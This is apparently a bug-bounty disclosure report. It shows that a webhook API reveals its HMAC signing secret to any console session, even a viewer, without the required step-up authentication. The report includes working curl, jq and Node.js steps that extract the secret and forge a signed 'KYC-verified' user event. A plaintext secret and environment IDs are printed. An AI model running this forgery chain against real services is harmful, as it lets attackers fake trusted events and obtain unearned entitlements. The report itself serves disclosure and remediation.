# Missing step-up authentication on webhook signing-secret reveal lets any console session — including viewer role — obtain the HMAC signing key and forge customer-trusted webhook events

**VRT:** Broken Access Control → Missing Step-Up Authentication (Privileged Action Without Re-Authentication) — **P2**
**Assets:** `app.dynamic.xyz` · `app.dynamicauth.com/api/v0`

## Summary

The OpenAPI spec for `GET /api/v0/environments/{environmentId}/webhooks/{webhookId}?includeSecret=true` states the request "requires step-up authentication: a valid elevated access token with the `console:webhook_secret:reveal` scope, minted for the calling user, must be sent in the `x-dyn-elevated-access-token` header **or the request is rejected with 403**."

In production this gate is **not enforced at all**:

1. A plain session JWT with **no** elevated token → **200** with the webhook signing secret in plaintext.
2. A garbage value in `x-dyn-elevated-access-token` → **200** (header completely unvalidated).
3. A **viewer**-role (least-privileged) member session → **200** with the plaintext secret, while the same session's write calls (PUT/POST/DELETE webhooks) are correctly 403 — the gap is specific to the secret-reveal action.

The revealed value is the **real HMAC-SHA256 signing key** — verified byte-exact against genuine deliveries (three independent confirmations, latest on traffic triggered after initial discovery). With it, an attacker signs arbitrary webhook events (e.g., `user.created` asserting `kycStatus: "verified"`, `verified: true`) that are **indistinguishable from Dynamic's own deliveries** and pass the standard customer-side verification (HMAC-SHA256 + constant-time compare). The signing scheme has no timestamp mixing, no canonicalization and no replay protection, and the public API exposes **no self-service rotation**, so a stolen secret stays valid until support intervenes.

## Steps to Reproduce

**1. Reveal the signing secret without step-up (any session, even viewer role):**

```bash
curl -s "https://app.dynamicauth.com/api/v0/environments/7dfe3b0c-c0db-4dfa-bba6-f72df97ccbd6/webhooks/721f79c5-572e-4d64-869d-680268d164b4?includeSecret=true" \
  -H "Authorization: Bearer <ANY_CONSOLE_SESSION_JWT>"
# → 200 {"secret":"dyn_Qfvm49E4cdO0AewRTjk{PAGBhx2t[RNpVMqajPTaQaq4Yme[f12LQka9", ...}
```

Contrast: `x-dyn-elevated-access-token: garbage-invalid-token` is also accepted (200), and the captcha `secretKey` on the same account is correctly masked — proving this endpoint alone skips the protection.

**2. Trigger a genuine delivery and capture it** (any user signup fires `user.created`; the webhook points to the researcher's receiver):

```bash
curl -s "https://webhook.site/token/72e683f6-959e-4264-8aa8-82f389ed746d/requests?page=1&sorting=newest" > inbox.json

# pin the GENUINE delivery by uuid — do NOT use .data[0] (newer traffic lands on top),
# and use jq -j — jq -r appends a trailing newline that breaks the HMAC:
jq '.data[] | select(.uuid=="701cbc0c-c24e-4524-aa2c-584c1c47159e")
    | {uuid, created_at, sig: .headers["x-dynamic-signature-256"][0], body: .content}' inbox.json | tee capture.json
jq -j '.body' capture.json > body.txt
wc -c body.txt   # → 1912 (exact bytes)
```

Captured: delivery `701cbc0c-c24e-4524-aa2c-584c1c47159e` @ 2026-10-26 01:27:37, header
`x-dynamic-signature-256: sha256=5fb5c66ff01f0991c7db28cc106ddf57ec43779b1c8c935c3df1bfd7426cc3a4`.

**3. Verify the leaked secret is the real signing key:**

```javascript
const crypto = require('crypto');
const SECRET = 'dyn_Qfvm49E4cdO0AewRTjk{PAGBhx2t[RNpVMqajPTaQaq4Yme[f12LQka9';
const rawBody  = require('fs').readFileSync('body.txt');   // exact bytes via jq -j
const captured = '5fb5c66ff01f0991c7db28cc106ddf57ec43779b1c8c935c3df1bfd7426cc3a4';
const computed = crypto.createHmac('sha256', SECRET).update(rawBody).digest('hex');
console.log('EXACT MATCH:', computed === captured);
```

→ `EXACT MATCH: true`. Reproduced on 3 independent deliveries: `38260fc6…` (23:27), `5fb5c66f…` (01:27), `ea9cace2…` (02:17 — traffic generated *after* discovery).

**4. Forge a customer-trusted user-status event and deliver it:**

```javascript
const forged = JSON.stringify({
  messageId: crypto.randomUUID(), eventId: crypto.randomUUID(),
  eventName: 'user.created', timestamp: new Date().toISOString(),
  webhookId: '721f79c5-572e-4d64-869d-680268d164b4',
  userId: 'attacker-chosen-user-id',
  environmentId: '7dfe3b0c-c0db-4dfa-bba6-f72df97ccbd6', environmentName: 'sandbox',
  data: { id: 'attacker-chosen-user-id', projectEnvironmentId: '7dfe3b0c-c0db-4dfa-bba6-f72df97ccbd6',
          email: 'attacker@evil.example', kycStatus: 'verified', verified: true },
});
require('fs').writeFileSync('forged.json', forged);
console.log('x-dynamic-signature-256: sha256=' +
  crypto.createHmac('sha256', SECRET).update(forged, 'utf8').digest('hex'));
```

```bash
curl -s -o /dev/null -w "HTTP %{http_code}\n" -X POST \
  "https://webhook.site/72e683f6-959e-4264-8aa8-82f389ed746d" \
  -H "Content-Type: application/json" \
  -H "x-dynamic-signature-256: sha256=4b993f1b2f72a86f41276d6797f38655f655ef024d1cc062d0a6faae2b9545a1" \
  -H "x-dynamic-webhook-version: 1.1.0" \
  --data-binary @forged.json
# → HTTP 200 — forged event sits in the customer's event pipeline next to genuine ones
```

## Impact

**The core impact: an attacker can fabricate a change in a user's status that customer backends treat as authentic.** The forged event above asserts a user (`attacker-chosen-user-id`, `attacker@evil.example`) whose status is `kycStatus: "verified"`, `verified: true` — signed with the key customers are told to trust, byte-identical in structure and scheme to genuine Dynamic deliveries. Any backend that creates users, grants entitlements, credits balances, auto-fulfills orders, or opens KYC/AML workflows off Dynamic webhooks accepts it as ground truth. The same capability extends to every event type a customer subscribes to (`user.updated`, wallet/transaction events), so arbitrary user-state transitions can be asserted at will.

**Receiver-side verification matrix** (Dynamic's documented scheme — HMAC-SHA256 over raw body, `sha256=` prefix, constant-time compare — run live on 2026-10-26):

| Input | Verdict |
|---|---|
| Genuine delivery + original header | VALID — accepted |
| **Forged, attacker-signed delivery** | **VALID — accepted** |
| Tampered genuine body (`user.created`→`user.deleted`) | INVALID — rejected |
| Forged body + wrong-secret signature | INVALID — rejected |

The negative controls prove the verifier is sound — the forged event passes for exactly one reason: the attacker holds the real signing key.

Aggravating factors: (a) the secret is obtainable from a **viewer**-role session — the least-privileged role, whose write actions are properly denied, so no privileged access is required; (b) the exact threat step-up re-auth exists to stop (stolen/XS-leaked session) yields full signing capability; (c) **no self-service rotation** exists in the 525-endpoint public API, so the stolen key persists until support intervenes; (d) all PoCs are cookieless, non-browser API replays — no victim interaction, no impossible prerequisites. Suggested fix: enforce the `console:webhook_secret:reveal` step-up gate on `includeSecret=true` and mask the secret by default (single reveal per rotation), as already done for the captcha `secretKey`.

## POC

Complete live chain executed 2026-10-26 01:27 UTC (all values below are real outputs):

1. **Secret reveal, no step-up:** `GET /environments/7dfe3b0c…/webhooks/721f79c5…?includeSecret=true` → **200** `{"secret":"dyn_Qfvm49E4cdO0AewRTjk{PAGBhx2t[RNpVMqajPTaQaq4Yme[f12LQka9", …}` — same 200 with a garbage elevated-token header; same 200 from a **viewer**-role session (while its PUT/POST/DELETE webhook calls are 403).
2. **Trigger genuine delivery:** `POST /environments/7dfe3b0c…/users` → **201**, user `7526c359` created; delivery `701cbc0c` fired in ~1 s (1912 bytes, sig `sha256=5fb5c66f…cc3a4`).
3. **HMAC exact match:** `HMAC-SHA256(leakedSecret, rawBody) = 5fb5c66ff01f0991c7db28cc106ddf57ec43779b1c8c935c3df1bfd7426cc3a4` = captured header → **EXACT MATCH: true** (×3 deliveries incl. post-discovery traffic `ea9cace2…` @ 02:17).
4. **Forged user-status event delivered:** payload asserting `kycStatus: "verified"` signed `sha256=4b993f1b…545a1` → **HTTP 200** into the customer receiver (item `ef98d209-8dd2-4ebe-ad42-c05985682a53`).
5. **Receiver-side verdict: forged = VALID** (indistinguishable from genuine; tampered body and wrong-secret controls both correctly INVALID).

Artifacts: full request-by-request transcript, corrected reproduction commands (delivery pinned by uuid, `jq -j` for byte-exact body), and the verification matrix — `reports/BUG-001-full-poc-forgery-chain.md`; receiver inbox with the forged delivery visible alongside genuine ones: `https://webhook.site/#!/72e683f6-959e-4264-8aa8-82f389ed746d`.
